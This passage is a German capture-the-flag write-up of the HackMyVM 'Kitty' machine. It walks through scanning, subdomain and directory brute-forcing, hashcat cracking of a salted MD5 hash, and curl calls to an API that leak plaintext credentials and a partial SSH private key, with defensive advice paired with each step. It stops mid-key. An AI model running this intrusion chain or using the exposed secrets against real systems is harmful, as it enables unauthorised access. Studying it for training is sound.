@@ -1,0 +1,1484 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kitty - HackMyVM - Hard - Vulnhub - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Kitty - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <!-- CSS muss hier die Farbe auf Rot setzen -->
+            <h2>Hard</h2>
+            <div class="circle">
+                 <!-- CSS muss hier die Farbe auf Rot setzen -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                 <!-- CSS muss hier die Hintergrundfarbe auf ein passendes Rot setzen -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">hashcat</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">pspy64</div>
+                <div class="tool-item">mysql</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">Metasploit (msfconsole)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">phpggc</div>
+                <div class="tool-item">base64</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Exploit)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung aktiver Hosts im lokalen Netzwerksegment. `arp-scan -l` sendet ARP-Anfragen an alle möglichen Adressen im lokalen Netz und listet die Antworten auf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl ist ein grundlegendes Werkzeug zur Netzwerkerkundung. Er zeigt uns die IP- und MAC-Adresse eines potenziellen Ziels (192.168.2.100), das zur PCS Systemtechnik GmbH gehört. Dies könnte unser Zielsystem sein oder ein anderes Gerät im Netz. Es ist wichtig, die IP zu notieren und weiter zu untersuchen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die gefundene IP-Adresse. Führen Sie als Nächstes einen Portscan (z.B. mit `nmap`) auf diese IP durch, um offene Dienste zu identifizieren.
+            <br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und Überwachung können helfen, die Sichtbarkeit von Hosts zu begrenzen und unautorisierte Scans zu erkennen. ARP-Spoofing-Schutzmechanismen können ebenfalls implementiert werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.100	08:00:27:e0:f6:fe	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Identifizierung der IP-Adresse (hier als 192.168.2.150 angenommen, vermutlich durch einen vorherigen Scan oder Korrektur) wird `nmap` verwendet, um offene Ports, Dienste und deren Versionen zu scannen.
+            <ul><li><code>-sS</code>: Führt einen SYN-Scan durch (Stealth Scan).</li><li><code>-sC</code>: Führt Standard-Nmap-Skripte aus, um zusätzliche Informationen zu sammeln.</li><li><code>-T5</code>: Setzt das Timing-Template auf "insane" für einen sehr schnellen Scan (potenziell auffällig und unzuverlässiger).</li><li><code>-sV</code>: Versucht, die Versionen der laufenden Dienste zu ermitteln.</li><li><code>-A</code>: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.</li><li><code>-p-</code>: Scannt alle 65535 TCP-Ports.</li></ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan deckt drei offene Ports auf:
+            <ul><li><span class="command">Port 22 (SSH)</span>: OpenSSH 8.4p1 auf Debian. Dies ist ein potenzieller Zugangspunkt, falls Zugangsdaten oder Schwachstellen gefunden werden. Die Host-Keys werden angezeigt.</li><li><span class="command">Port 80 (HTTP)</span>: Nginx 1.18.0. Ein Webserver läuft. Die Skripte erkennen eine Weiterleitung auf `http://kitty.hmv`, was auf eine namensbasierte Konfiguration hindeutet. Der Server-Header bestätigt Nginx.</li><li><span class="command">Port 3000 (PPP?)</span>: Nmap ist unsicher über den Dienst (`ppp?`). Die `fingerprint-strings` deuten jedoch auf einen HTTP-basierten Dienst hin, der auf ungültige Anfragen mit `HTTP/1.1 400 Bad Request` und `HTTP/1.0 200 OK` reagiert. Dies könnte eine API oder eine andere Webanwendung sein.</li></ul>
+            Diese Ergebnisse sind entscheidend für die nächsten Schritte, insbesondere die Webserver auf Port 80 und 3000 sowie der SSH-Dienst.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Fügen Sie `kitty.hmv` und die IP `192.168.2.150` zur `/etc/hosts`-Datei hinzu, um auf den Webserver auf Port 80 zugreifen zu können.</li><li>Untersuchen Sie die Webanwendungen auf Port 80 und 3000 genauer (Verzeichnis-Bruteforce, Schwachstellen-Scans).</li><li>Prüfen Sie den SSH-Dienst auf bekannte Schwachstellen oder versuchen Sie, Standard-/schwache Zugangsdaten zu erraten.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Halten Sie alle Dienste (SSH, Nginx, die Anwendung auf Port 3000) auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden.</li><li>Beschränken Sie den Zugriff auf Dienste nur auf notwendige Netzwerke/IPs.</li><li>Implementieren Sie Intrusion Detection/Prevention Systeme (IDS/IPS), um aggressive Scans wie `nmap -T5 -A -p-` zu erkennen und zu blockieren.</li><li>Konfigurieren Sie Webserver so, dass detaillierte Versionsinformationen (Server-Header) unterdrückt werden.</li><li>Überprüfen Sie die Notwendigkeit des Dienstes auf Port 3000 und sichern Sie ihn angemessen ab.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.150 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at ...
+Nmap scan report for 192.168.2.150
+Host is up (0.0010s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 27:71:24:58:d3:7c:b3:8a:7b:32:49:d1:c8:0b:4c:ba (RSA)
+|   256 e2:30:67:38:7b:db:9a:86:21:01:3e:bf:0e:e7:4f:26 (ECDSA)
+|_  256 5d:78:c5:37:a8:58:dd:c4:b6:bd:ce:b5:ba:bf:53:dc (ED25519)
+<span class="command">80/tcp   open  http    nginx 1.18.0</span>
+|_http-title: Did not follow redirect to http://kitty.hmv
+|_http-server-header: nginx/1.18.0
+<span class="command">3000/tcp open  ppp?</span>
+| fingerprint-strings:
+|   GenericLines, Help, RTSPRequest:
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+[...]
+MAC Address: 08:00:27:E0:F6:FE (PCS Systemtechnik GmbH)
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.4 - 5.17
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.03 ms 192.168.2.150
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.15 seconds</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` ist ein Webserver-Scanner, der nach bekannten Schwachstellen, Fehlkonfigurationen, Standarddateien und anderen Sicherheitsproblemen sucht. Hier wird er auf den Webserver auf Port 80 (IP `192.168.2.150`) angewendet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Nikto bestätigt den `nginx/1.18.0` Server und identifiziert mehrere fehlende Sicherheitsheader:
+             <ul><li>`X-Frame-Options`: Nicht vorhanden. Erhöht das Risiko von Clickjacking-Angriffen.</li><li>`X-XSS-Protection`: Nicht definiert. Ältere Browser könnten anfälliger für bestimmte Cross-Site-Scripting (XSS)-Angriffe sein, obwohl dieser Header oft durch `Content-Security-Policy` ersetzt wird.</li><li>`X-Content-Type-Options`: Nicht gesetzt. Könnte Browser dazu verleiten, Inhalte anders als den deklarierten MIME-Typ zu interpretieren (MIME-Sniffing), was zu XSS führen kann.</li></ul>
+             Nikto bestätigt auch die Weiterleitung von `/` auf `http://kitty.hmv`. Es findet keine Standard-CGI-Verzeichnisse.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beachten Sie die fehlenden Header als potenzielle, wenn auch oft geringfügige, Schwachstellen. Konzentrieren Sie sich weiterhin auf die Enumeration von Inhalten und Anwendungslogik. Die Weiterleitung unterstreicht die Notwendigkeit, den Hostnamen `kitty.hmv` in `/etc/hosts` zu verwenden.
+             <br><strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Content-Security-Policy`) in der Nginx-Konfiguration, um die Sicherheit gegen Clickjacking und bestimmte XSS-Varianten zu erhöhen. Verwenden Sie `nikto -h <IhreDomain> -update`, um Nikto zu aktualisieren und erneut zu scannen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.150</span></div>
+                    <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.150
++ Target Hostname:    192.168.2.150
++ Target Port:        80
++ Start Time:         2022-10-16 00:19:02 (GMT2)
+---------------------------------------------------------------------------
++ Server: <span class="command">nginx/1.18.0</span>
++ <span class="password">The anti-clickjacking X-Frame-Options header is not present.</span>
++ <span class="password">The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span>
++ <span class="password">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span>
++ <span class="password">Root page / redirects to: http://kitty.hmv</span>
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ 6553 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2022-10-16 00:19:15 (GMT2) (13 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Da der Webserver auf Port 80 (`kitty.hmv`) virtuelle Hosts verwendet (erkennbar an der Weiterleitung), wird `wfuzz` eingesetzt, um nach weiteren Subdomains unter `kitty.hmv` zu suchen.
+            <ul><li><code>-c</code>: Aktiviert Farbausgabe.</li><li><code>-w ...</code>: Gibt die Wortliste an (hier eine Liste gängiger Subdomains).</li><li><code>-H "Host: FUZZ.kitty.hmv"</code>: Modifiziert den Host-Header. `FUZZ` wird durch die Einträge aus der Wortliste ersetzt.</li><li><code>-u http://kitty.hmv</code>: Die Basis-URL.</li><li><code>--hh 169</code>: Versteckt Antworten mit 169 Zeichen (wahrscheinlich die Standard-Weiterleitungsseite).</li></ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> `wfuzz` findet eine gültige Subdomain: `<span class="command">cookie</span>.kitty.hmv`. Diese antwortet mit Statuscode 200 (OK) und hat eine andere Größe als die ausgeblendeten Antworten, was darauf hindeutet, dass hier anderer Inhalt zu finden ist. Die Warnung bezüglich OpenSSL ist für HTTP-Scans in der Regel irrelevant.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie die neu entdeckte Subdomain `cookie.kitty.hmv` ebenfalls zur `/etc/hosts`-Datei hinzu, die auf die IP `192.168.2.150` zeigt. Untersuchen Sie anschließend `http://cookie.kitty.hmv/` auf Inhalte und Schwachstellen.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Subdomains öffentlich erreichbar sind. Implementieren Sie ggf. Wildcard-DNS-Einträge mit Bedacht und sorgen Sie dafür, dass nicht verwendete virtuelle Hosts korrekt deaktiviert oder gesichert sind. Überwachen Sie DNS-Anfragen und Webserver-Logs auf Anzeichen von Subdomain-Enumeration.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.kitty.hmv" -u http://kitty.hmv --hh 169</span></div>
+                    <pre>
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://kitty.hmv/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+<span class="command">000003045:   200        37 L     105 W      2785 Ch     "cookie"</span>
+
+Total time: 10.19699s
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 489.2628
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Um auf die Webseiten `kitty.hmv` und die neu entdeckte Subdomain `cookie.kitty.hmv` zugreifen zu können, wird die lokale `/etc/hosts`-Datei bearbeitet. `vi` ist ein textbasierter Editor.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Zeile `<span class="command">192.168.2.150    cookie.kitty.hmv kitty.hmv</span>` wird hinzugefügt. Dies weist das lokale System an, Anfragen an diese Hostnamen direkt an die IP-Adresse des Zielservers zu senden, anstatt einen DNS-Server zu befragen. Dies ist ein notwendiger Schritt, um Webseiten zu erreichen, die über virtuelle Hosts auf dem Zielserver konfiguriert sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass die Datei korrekt gespeichert wird. Überprüfen Sie die Erreichbarkeit der Webseiten im Browser oder mit `curl`, um sicherzustellen, dass der Eintrag funktioniert.
+            <br><strong>Empfehlung (Admin):</strong> Dies ist eine lokale Konfigurationsänderung auf dem Angreifer-System und hat keine direkten Auswirkungen auf den Server. Es zeigt jedoch, wie virtuelle Hosts aufgelöst werden können, wenn kein entsprechender öffentlicher DNS-Eintrag existiert.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+# Host-Datei Inhalt (nach Bearbeitung):
+127.0.0.1	 localhost
+127.0.1.1  	 cyber
+
+<span class="command">192.168.2.150    cookie.kitty.hmv kitty.hmv</span>
+</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <p class="analysis"><strong>Analyse:</strong> Nach der Konfiguration der `/etc/hosts`-Datei wird `gobuster` verwendet, um Verzeichnisse und Dateien auf der Subdomain `http://cookie.kitty.hmv/` zu finden.
+            <ul><li><code>dir</code>: Modus für Verzeichnis-/Datei-Enumeration.</li><li><code>-u http://cookie.kitty.hmv/</code>: Die Ziel-URL.</li><li><code>-w ...</code>: Die Wortliste (hier eine mittelgroße Liste von Verzeichnisnamen).</li><li><code>-e</code>: Erweiterter Modus, gibt vollständige URLs aus.</li><li><code>-x ...</code>: Eine Liste von Dateierweiterungen, die zusätzlich zu den Verzeichnisnamen getestet werden sollen.</li><li><code>-t 100</code>: Anzahl der Threads (sehr hoch, potenziell laut).</li><li><code>-s "200,204,301,302,307,401"</code>: Nur Ergebnisse mit diesen HTTP-Statuscodes anzeigen (Erfolg, Weiterleitung, Authentifizierung erforderlich).</li><li><code>| grep -v "Size: 0"</code>: Filtert Ergebnisse heraus, die eine Größe von 0 haben (oft uninteressant).</li></ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> `gobuster` entdeckt mehrere interessante Pfade:
+            <ul><li><code>/home</code> (Status 301 -> <code>/home/</code>): Ein potenzielles Benutzerverzeichnis oder eine Startseite.</li><li><code>/register.php</code> (Status 200): Eine Registrierungsseite. Dies ist oft ein guter Angriffspunkt.</li><li><code>/login.php</code> (Status 200): Eine Anmeldeseite. Hier könnten Zugangsdaten getestet werden.</li><li><code>/index.php</code> (Status 200): Die Hauptseite.</li><li><code>/assets</code> (Status 301 -> <code>/assets/</code>): Ein Verzeichnis für statische Dateien (CSS, JS, Bilder).</li><li><code>/config</code> (Status 301 -> <code>/config/</code>): Ein Konfigurationsverzeichnis. Zugriff darauf könnte sensible Informationen preisgeben.</li></ul>
+            Diese Funde, insbesondere `register.php`, `login.php` und `/config/`, sind wichtige Angriffspunkte.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Untersuchen Sie `register.php` und `login.php` auf Schwachstellen (z.B. SQL-Injection, schwache Passwortrichtlinien, Brute-Force-Möglichkeiten).</li><li>Versuchen Sie, auf das `/config/`-Verzeichnis zuzugreifen und nach Konfigurationsdateien zu suchen (`db.php`, `config.php`, etc.).</li><li>Analysieren Sie den Quellcode und die Netzwerkanfragen der gefundenen Seiten im Browser.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Stellen Sie sicher, dass Verzeichnisse wie `/config` nicht öffentlich zugänglich sind (z.B. durch `.htaccess` oder Nginx-Konfiguration).</li><li>Implementieren Sie Rate-Limiting und Account-Lockout-Mechanismen auf Login- und Registrierungsseiten, um Brute-Force-Angriffe zu erschweren.</li><li>Validieren und bereinigen Sie alle Benutzereingaben, um SQL-Injection und andere Injection-Angriffe zu verhindern.</li><li>Verwenden Sie sichere Passwort-Hashing-Algorithmen (z.B. Argon2, bcrypt) mit Salt.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://cookie.kitty.hmv/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,.bck,mp4,mkv -t 100 -e -s "200,204,301,302,307,401" | grep -v "Size: 0"</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://cookie.kitty.hmv/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              zip,flac,dsd,xml,tar,bak,mp3,alac,wav,txt,jpeg,js,aac,ogg,7z,py,png,git,html,sql,jpg,mp4,mkv,php,pl,aiff,bck
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/16 00:23:22 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://cookie.kitty.hmv/home</span>                 (Status: 301) [Size: 169] [--&gt; http://cookie.kitty.hmv/home/]
+<span class="command">http://cookie.kitty.hmv/register.php</span>         (Status: 200) [Size: 3796]
+<span class="command">http://cookie.kitty.hmv/login.php</span>            (Status: 200) [Size: 3015]
+<span class="command">http://cookie.kitty.hmv/index.php</span>            (Status: 200) [Size: 2785]
+<span class="command">http://cookie.kitty.hmv/assets</span>               (Status: 301) [Size: 169] [--&gt; http://cookie.kitty.hmv/assets/]
+<span class="command">http://cookie.kitty.hmv/config</span>               (Status: 301) [Size: 169] [--&gt; http://cookie.kitty.hmv/config/]
+
+===============================================================
+2022/10/16 00:24:10 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+
+
+           <p class="analysis"><strong>Analyse:</strong> Hier wird `hashcat` vorbereitet, um einen Passwort-Hash zu knacken. Der Hash `357f47546ba3ab1cf633d3d0c54e2583` zusammen mit dem Salt `YXZpam5leWFt` wird angegeben.
+           <ul><li><code>-m 10</code>: Spezifiziert den Hash-Typ `md5($pass.$salt)`.</li><li><code>-a 0</code>: Wählt den Angriffsmodus "Straight" (Wörterbuchangriff).</li><li><code>357f...:YXZ...</code>: Der Hash und der Salt, getrennt durch einen Doppelpunkt.</li><li><code>/usr/share/wordlists/rockyou.txt</code>: Die verwendete Wörterbuchdatei.</li></ul>
+           Die Ausgabe zeigt, dass `hashcat` startet und die verfügbare Hardware (AMD Ryzen 9 CPU) erkennt. Es werden Informationen über die Passwort- und Salt-Längen angezeigt.</p>
+           <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Versuch, ein Passwort zu knacken, das vermutlich aus der Webanwendung (`cookie.kitty.hmv`) stammt (wahrscheinlich aus der Datenbank, die später untersucht wird). Der Hash-Typ `md5($pass.$salt)` ist relativ unsicher. Die `rockyou.txt`-Liste ist eine gängige Wahl für Wörterbuchangriffe. Der Erfolg dieses Angriffs hängt davon ab, ob das ursprüngliche Passwort in der Wortliste enthalten ist. *Wichtiger Hinweis: Der Text zeigt nur den Start von Hashcat, nicht das Ergebnis. Es ist unklar, ob das Passwort geknackt wurde.*</p>
+           <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lassen Sie `hashcat` laufen. Wenn es erfolgreich ist, notieren Sie das gefundene Passwort und versuchen Sie, es für den entsprechenden Benutzer (vermutlich 'gitea', wie später entdeckt) auf der Login-Seite oder per SSH zu verwenden. Wenn nicht erfolgreich, versuchen Sie andere Wortlisten oder Angriffsmodi (z.B. Regel-basiert `-a 0 -r rules/best64.rule`).
+           <br><strong>Empfehlung (Admin):</strong> Verwenden Sie niemals MD5 zum Hashen von Passwörtern. Setzen Sie moderne, starke Hashing-Algorithmen wie Argon2 oder bcrypt mit einem eindeutigen Salt pro Benutzer ein. Erzwingen Sie komplexe Passwörter und verbieten Sie die Verwendung von Passwörtern, die in bekannten Datenlecks vorkommen.</p>
+           <div class="code-block">
+               <div class="terminal">
+                   <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hashcat -m 10 -a 0 357f47546ba3ab1cf633d3d0c54e2583:YXZpam5leWFt /usr/share/wordlists/rockyou.txt</span></div>
+                   <pre>
+hashcat (v6.2.5) starting
+
+OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+=======================================================================================================================================
+* Device #1: pthread-AMD Ryzen 9 5900X 12-Core Processor, 11189/22442 MB (4096 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+[...]
+</pre>
+               </div>
+           </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `curl`-Befehl wird verwendet, um eine HTTP-GET-Anfrage an einen Endpunkt einer API zu senden, die unter `http://whythisapiissofast.kitty.hmv:3000/api/v2/-1` läuft. Der Hostname `whythisapiissofast.kitty.hmv` wurde vermutlich durch Analyse von Netzwerkanfragen, Quellcode oder Datenbankeinträgen (wie später ersichtlich) entdeckt und muss ebenfalls in `/etc/hosts` eingetragen werden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die API antwortet mit einem JSON-Objekt, das Zugangsdaten enthält: `<span class="password">"Credentials":"nobody : 74k3!7345y"</span>`. Dies ist ein kritischer Fund. Es scheint sich um einen Benutzernamen (`nobody`) und ein Passwort (`74k3!7345y`) zu handeln. Der Endpunkt `-1` deutet möglicherweise auf einen unsicheren direkten Objektverweis (IDOR) oder eine absichtlich platzierte Information hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            <ol><li>Tragen Sie `whythisapiissofast.kitty.hmv` in `/etc/hosts` ein.</li><li>Notieren Sie die gefundenen Zugangsdaten (`nobody:74k3!7345y`).</li><li>Versuchen Sie, sich mit diesen Zugangsdaten per SSH oder auf einer der Web-Login-Seiten (`cookie.kitty.hmv/login.php` oder eine eventuell vorhandene Login-Seite für `kitty.hmv`) anzumelden.</li><li>Testen Sie weitere Endpunkte der API (z.B. `-2`, `0`, `1`, etc.), um nach weiteren Schwachstellen oder Informationen zu suchen.</li></ol>
+            <strong>Empfehlung (Admin):</strong>
+            <ol><li>Speichern Sie niemals Klartext-Zugangsdaten oder sensible Informationen in API-Antworten.</li><li>Sichern Sie API-Endpunkte angemessen ab (Authentifizierung, Autorisierung).</li><li>Vermeiden Sie IDOR-Schwachstellen, indem Sie Benutzerberechtigungen überprüfen, bevor Daten zurückgegeben werden. Verwenden Sie indirekte Objektverweise.</li><li>Führen Sie regelmäßige Sicherheitsüberprüfungen und Penetrationstests Ihrer APIs durch.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://whythisapiissofast.kitty.hmv/api/v2/-1</span></div>
+                    <pre>
+{"success":"Yay! You Found Login Credentials",<span class="password">"Credentials":"nobody : 74k3!7345y"</span>}</pre>
+                </div>
+            </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Aufbauend auf dem vorherigen Fund wird nun der API-Endpunkt `-2` mit `curl` abgefragt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die API gibt einen privaten SSH-Schlüssel im PEM-Format zurück. Dies ist ein weiterer extrem kritischer Fund. Private Schlüssel sollten niemals auf diese Weise exponiert werden. Der Schlüssel beginnt mit `-----BEGIN OPENSSH PRIVATE KEY-----` und endet mit `-----END OPENSSH PRIVATE KEY-----`. Im Kommentar des Schlüssels steht `<span class="password">dyutidhara@free4all</span>`, was stark auf den zugehörigen Benutzernamen `dyutidhara` hindeutet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+             <ol><li>Speichern Sie den ausgegebenen Schlüssel in einer Datei (z.B. `id_rsa_kitty`).</li><li>Ändern Sie die Berechtigungen der Schlüsseldatei auf `600` (`chmod 600 id_rsa_kitty`).</li><li>Versuchen Sie, sich per SSH als Benutzer `dyutidhara` mit diesem Schlüssel am Zielsystem anzumelden (`ssh dyutidhara@kitty.hmv -i id_rsa_kitty`).</li></ol>
+             <strong>Empfehlung (Admin):</strong>
+             <ol><li>Entfernen Sie sofort den exponierten privaten Schlüssel von der API.</li><li>Generieren Sie ein neues Schlüsselpaar für den Benutzer `dyutidhara` und widerrufen Sie den alten öffentlichen Schlüssel aus der `authorized_keys`-Datei des Servers.</li><li>Überprüfen Sie den gesamten Code der API auf ähnliche Schwachstellen, bei denen sensible Daten oder Dateien preisgegeben werden.</li><li>Implementieren Sie strikte Zugriffskontrollen und verhindern Sie Path-Traversal- oder IDOR-Angriffe, die zum Auslesen von Dateien führen könnten.</li></ol></p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://whythisapiissofast.kitty.hmv/api/v2/-2</span></div>
+                    <pre><span class="password">
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAuNJRFQ6edscpMQQAh/1UqAZDQvRJGJ2dWNYBs5NWTQMA4PC6oab
+xBymQQkc3KvgtEyQ7ZQLDyPHC5yQ3JhYmjBxHkvyHHNcjXoG1yw3FXLrGGSGpbYpb4oo9
+siJ1ZmFnyewS5Uui6G0g5mW56GzMhWHmbiP+IMUPUCJ/mYikzJz1NN21w2b4r3b971Dfj
+oRU81iu3lI8M/3GeXNDNQr7zHAPAufMuA8KU0aRb6qeLzpLy6rDKnSw8kKJ11oaEFI+ve
+REA2kNZojTj89Zwk9ffW8IMl025vDfDII+qahH1uIaHMUjByi1zBIecBffLZ/r66RRfVu
+KxIIvNnTWXb/MDrIbo4kG6gLxNvD+sLvQJhDwJZFwfK40sBe/83isVvmYCVtdADZNzTdqL
+9X2Ti9beIAhfuBy2jgvMYaLRZsJPI3k5g58CDoaxNd7KNxKultg7dHP7IXEngsxkBu9ha9
+pix/984Mg/GzItWAQdIEEeU7gcxy/mT0nr6U6UTAAAFkDl7N0zpezdAAAAB3NzaC1yc2
+EAAAGBALjSURUnnbHKTDkEAIf9VKgGQ0L0SRidnVjWAbTVk0DADwuqGm8QTspkEJHNy
+r4LRMk2UCw8jxwuckNyYWJowcR5L8hxzXI16BtcsNxVy6xhkhqW2KW+KKPbIidWZhZ8ns
+EuVLouhtIZluehszIVh5m4j/iDFD1Aif5mIpMzic9TTdtcNm+K92/e9Q346EVPNYrt5SP
+DP9xnlzQzUK+8xwDwDrnzLgPClNGkW+qni86S8uqwyp0sPJCiddaGhBSPr3kRANpDWaI04
